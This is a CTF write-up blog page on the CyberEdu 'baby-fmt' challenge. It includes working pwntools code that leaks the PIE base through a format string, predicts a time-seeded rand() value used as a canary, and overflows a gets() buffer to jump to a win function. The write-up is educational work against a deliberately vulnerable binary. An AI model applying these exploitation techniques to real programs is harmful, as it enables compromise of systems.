<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CyberEdu baby-fmt Writeup | Irina&#39;s CTF Writeups</title>
<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Format-String, Random">
<meta name="description" content="Merry Christmas everyone! üéÑ
Challenge overview
This is should be a basic pwn challenge but please be aware that time is not your friend.

Let&rsquo;s check out the restrictions we&rsquo;re dealing with.

We&rsquo;re working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let&rsquo;s take a look at the disassembled binary.
We have a function called by main, let&rsquo;s call it vuln.">
<meta name="author" content="">
<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/babyfmt-writeup/">
<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/babyfmt-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/babyfmt-writeup/">
  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
  <meta property="og:title" content="CyberEdu baby-fmt Writeup">
  <meta property="og:description" content="Merry Christmas everyone! üéÑ
Challenge overview This is should be a basic pwn challenge but please be aware that time is not your friend.
Let‚Äôs check out the restrictions we‚Äôre dealing with.
We‚Äôre working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let‚Äôs take a look at the disassembled binary.
We have a function called by main, let‚Äôs call it vuln.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-12-26T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-12-26T00:00:00+00:00">
    <meta property="article:tag" content="CyberEdu">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Buffer-Overflow">
    <meta property="article:tag" content="Format-String">
    <meta property="article:tag" content="Random">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CyberEdu baby-fmt Writeup">
<meta name="twitter:description" content="Merry Christmas everyone! üéÑ
Challenge overview
This is should be a basic pwn challenge but please be aware that time is not your friend.

Let&rsquo;s check out the restrictions we&rsquo;re dealing with.

We&rsquo;re working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let&rsquo;s take a look at the disassembled binary.
We have a function called by main, let&rsquo;s call it vuln.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://irinasusca.github.io/writeup-blog/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CyberEdu baby-fmt Writeup",
      "item": "https://irinasusca.github.io/writeup-blog/posts/babyfmt-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CyberEdu baby-fmt Writeup",
  "name": "CyberEdu baby-fmt Writeup",
  "description": "Merry Christmas everyone! üéÑ\nChallenge overview This is should be a basic pwn challenge but please be aware that time is not your friend.\nLet\u0026rsquo;s check out the restrictions we\u0026rsquo;re dealing with.\nWe\u0026rsquo;re working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let\u0026rsquo;s take a look at the disassembled binary.\nWe have a function called by main, let\u0026rsquo;s call it vuln.\n",
  "keywords": [
    "CyberEdu", "pwn", "buffer-overflow", "Format-String", "Random"
  ],
  "articleBody": "Merry Christmas everyone! üéÑ\nChallenge overview This is should be a basic pwn challenge but please be aware that time is not your friend.\nLet‚Äôs check out the restrictions we‚Äôre dealing with.\nWe‚Äôre working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let‚Äôs take a look at the disassembled binary.\nWe have a function called by main, let‚Äôs call it vuln.\nThen, a win function.\nA function that checks whether a string passed as an argument appears inside \"bucurest iasi cluj timisoar brasov constant\"\nAnd lastly, a hacking detection function that checks that we didn‚Äôt modify the value of dword_402C, a ‚Äúrandomly‚Äù generated variable in vuln.\nIdentifying the vulnerabilities Our main concern here should be finding a way to redirect into our win function. So let‚Äôs break down what happens in vuln.\nFirst, v5 is assigned a random value like so:\nv0 = time(0); srand(v0); v5 = rand(); dword_402C = v5; This means all random numbers generated this way that same second will be the same.\nNext, we input 8 bytes into s, and then the newline gets turned into a null byte. To access the fmtstr vulnerability, we need to reach the vulnerable branch of the if, which means our s, or city, can‚Äôt be contained by the city string.\nThen, the gets(v4); leaves us with a buffer overflow, and v5 operating something like a canary. No problem though, because we can just find it out ourselves.\nAlright, so we can only print values one at at time, because of the small s buffer. Since we can only pick one to see, we‚Äôd better find the PIE base and another way to get that v5 random value.\nAt offset 17, I found an address that‚Äôs PIE base + 0x148f, and upon checking, it‚Äôs actually main. From that, we can calculate win. Next, we just need to simulate the random number generation.\nThe exploit Getting v5 will be pretty easy; we just need to generate our own number with the same lines of code, inside out python script. We can use ctypes for that.\nEssentially, what that means is we can write our own identical C code inside python. To make sure we get the correct number, I took a range of 10 seeds, just in case. Then I picked the one corresponding to the value of dword_402c in gdb with gef, and I settled on the 5th one, which was just now. But I still left the loop in, just in case timings will differ remotely (great foresight on my part).\nfrom pwn import * from ctypes import CDLL import time libc = CDLL(\"/lib/x86_64-linux-gnu/libc.so.6\") now = int(time.time()) i=5 j=1 for seed in range(now - 5, now + 5): libc.srand(seed) random = libc.rand() print(seed, random) if i==j: random_number = random j=j+1 print(f\"random number for i={i} is {random_number}\") Now, we can create our payload properly without getting detected:\np.recvuntil(b'?\\n') p.sendline(b\"%17$p\") p.recvline() main = int(p.recvline().strip(), 16) print(hex(main)) #17 is pie base + 0x148f pie = main - 0x148f win = pie + 0x133b print(hex(win)) p.recvuntil(b'?\\n') #gets(v4) v4 = b\"A\"*5 #the actual v4 buffer v4 += p32(random_number) #4 byte v5 v4 += b'\\x90' * 20 #padding until rbp v4 += b'\\x90' * 8 #rbp, 8 bytes v4 += p64(win) #win finally p.sendline(v4) And, we get our flag locally!\nTime to test it out remotely‚Ä¶ We might encounter the problem of different libc versions for the random generator or offsets, or both!\nLooks like it was offsets now.\nI found another PIE looking address at offset 8, and I assumed it was PIE base + 0x1400. I messed around with different i values for a while, and after trying everything from now-5 to now+5, I was ready to give up, but I told myself I‚Äôd extend the radius a little and went up to now+10. I set the i to 20 so I would actually use the now+10 seed, and I was completely shocked to see I actually got the flag!\nAs always, the full code can be found on my GitHub here.\n",
  "wordCount" : "680",
  "inLanguage": "en",
  "datePublished": "2025-12-26T00:00:00Z",
  "dateModified": "2025-12-26T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://irinasusca.github.io/writeup-blog/posts/babyfmt-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Irina's CTF Writeups",
    "logo": {
      "@type": "ImageObject",
      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CyberEdu baby-fmt Writeup
    </h1>
    <div class="post-meta"><span title='2025-12-26 00:00:00 +0000 UTC'>December 26, 2025</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
                <li>
                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
                <li>
                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>Merry Christmas everyone! üéÑ</p>
<h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
<p><strong><a href="https://app.cyber-edu.co/challenges/3d3ef3d0-94fb-11ea-93fe-e7b039c31d38?tenant=cyberedu">This</a></strong> is should be a basic pwn challenge but please be aware that time is not your friend.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic2.png#center"></p>
<p>Let&rsquo;s check out the restrictions we&rsquo;re dealing with.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic1.png#center"></p>
<p>We&rsquo;re working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let&rsquo;s take a look at the disassembled binary.</p>
<p>We have a function called by <code>main</code>, let&rsquo;s call it <code>vuln</code>.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic3.png#center"></p>
<p>Then, a <code>win</code> function.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic4.png#center"></p>
<p>A function that checks whether a string passed as an argument appears inside <code>&quot;bucurest iasi cluj timisoar brasov constant&quot;</code></p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic5.png#center"></p>
<p>And lastly, a hacking detection function that checks that we didn&rsquo;t modify the value of <code>dword_402C</code>, a &ldquo;randomly&rdquo; generated variable in <code>vuln</code>.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic6.png#center"></p>
<hr>
<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
<p>Our main concern here should be finding a way to redirect into our <code>win</code> function. So let&rsquo;s break down what happens in <code>vuln</code>.</p>
<p>First, <code>v5</code> is assigned a random value like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>v0 <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  srand(v0);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> rand();
</span></span><span style="display:flex;"><span>  dword_402C <span style="color:#f92672">=</span> v5;
</span></span></code></pre></div><p>This means all random numbers generated this way that same second will be the same.</p>
<p>Next, we input 8 bytes into <code>s</code>, and then the newline gets turned into a null byte. To access the fmtstr vulnerability, we need to reach the vulnerable branch of the <code>if</code>, which means our <code>s</code>, or <em>city</em>, can&rsquo;t be contained by the city string.</p>
<p>Then, the <code>gets(v4);</code> leaves us with a buffer overflow, and <code>v5</code> operating something like a canary. No problem though, because we can just find it out ourselves.</p>
<hr>
<p>Alright, so we can only print values one at at time, because of the small <code>s</code> buffer. Since we can only pick one to see, we&rsquo;d better find the PIE base and another way to get that <code>v5</code> random value.</p>
<p>At offset 17, I found an address that&rsquo;s <code>PIE base + 0x148f</code>, and upon checking, it&rsquo;s actually <code>main</code>. From that, we can calculate <code>win</code>. Next, we just need to simulate the random number generation.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic7.png#center"></p>
<hr>
<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
<p>Getting <code>v5</code> will be pretty easy; we just need to generate our own number with the same lines of code, inside out python script. We can use <code>ctypes</code> for that.</p>
<p>Essentially, what that means is we can write our own identical C code inside python. To make sure we get the correct number, I took a range of 10 seeds, just in case. Then I picked the one corresponding to the value of <code>dword_402c</code> in gdb with gef, and I settled on the 5th one, which was just <em>now</em>. But I still left the loop in, just in case timings will differ remotely <em>(great foresight on my part)</em>.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic8.png#center"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> CDLL
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> CDLL(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>now <span style="color:#f92672">=</span> int(time<span style="color:#f92672">.</span>time())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>i<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>j<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> seed <span style="color:#f92672">in</span> range(now <span style="color:#f92672">-</span> <span style="color:#ae81ff">5</span>, now <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>):
</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>srand(seed)
</span></span><span style="display:flex;"><span>    random <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand()
</span></span><span style="display:flex;"><span>    print(seed, random)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">==</span>j:
</span></span><span style="display:flex;"><span>    	random_number <span style="color:#f92672">=</span> random
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    j<span style="color:#f92672">=</span>j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;random number for i=</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> is </span><span style="color:#e6db74">{</span>random_number<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Now, we can create our payload properly without getting detected:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%17$p&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(main))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#17 is pie base + 0x148f</span>
</span></span><span style="display:flex;"><span>pie <span style="color:#f92672">=</span> main <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x148f</span>
</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x133b</span>
</span></span><span style="display:flex;"><span>print(hex(win))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gets(v4)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#the actual v4 buffer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">+=</span> p32(random_number)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#4 byte v5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#padding until rbp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#rbp, 8 bytes</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">+=</span> p64(win)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#win finally</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(v4)
</span></span></code></pre></div><p>And, we get our flag locally!</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic9.png#center"></p>
<p>Time to test it out remotely&hellip; We might encounter the problem of different libc versions for the random generator or offsets, or both!</p>
<p>Looks like it was offsets now.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic11.png#center"></p>
<p>I found another PIE looking address at offset 8, and I assumed it was <code>PIE base + 0x1400</code>. I messed around with different <code>i</code> values for a while, and after trying everything from <code>now-5</code> to <code>now+5</code>, I was ready to give up, but I told myself I&rsquo;d extend the radius a little and went up to <code>now+10</code>. I set the <code>i</code> to 20 so I would actually use the <code>now+10</code> seed, and I was completely shocked to see I <em>actually</em> got the flag!</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyfmt-writeup/pic12.png#center"></p>
<hr>
<p>As always, the full code can be found on my GitHub
<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/babyfmt.py">here</a></strong>.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/format-string/">Format-String</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/random/">Random</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
